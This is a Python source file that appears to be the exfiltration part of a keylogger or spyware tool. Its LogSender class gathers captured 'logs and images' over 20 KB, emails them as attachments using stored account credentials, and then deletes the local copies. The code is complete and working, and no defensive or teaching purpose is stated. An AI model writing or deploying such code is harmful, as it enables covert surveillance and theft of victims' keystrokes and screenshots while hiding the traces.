from mail import Mail
from os import listdir
from os.path import getsize
from os import remove
from os.path import exists


class LogSender(Mail):

    def __init__(self, email, password):
        super().__init__(email, password)
        self.logs_path = "logs\\"

    def get_logs_to_send(self):
        """
        This function returns all files (logs and images), that are bigger than twenty KB.

        :return: List with logs to send
        """

        all_logs = [self.logs_path + file for file in listdir(self.logs_path)]

        twenty_kb = 20480
        logs_to_send = filter(lambda file: getsize(file) >= twenty_kb, all_logs)

        return list(logs_to_send)

    def delete_sent_logs(self):
        """
        This function deletes all files (logs and images), that are sent to the email.
        """

        sent_logs = self.get_logs_to_send()

        for file in sent_logs:
            if exists(file):
                remove(file)

    def send_logs(self):
        """
        This function sends all files (logs and images) to the email, that are bigger than twenty KB.
        When finished, it deletes these files from the disk.
        """

        logs_to_send = self.get_logs_to_send()
        mail = self.create_mail()

        if logs_to_send:  # if list is not empty
            for file in logs_to_send:
                self.add_attachment(mail, file)

        self.send_mail(mail)
        self.delete_sent_logs()
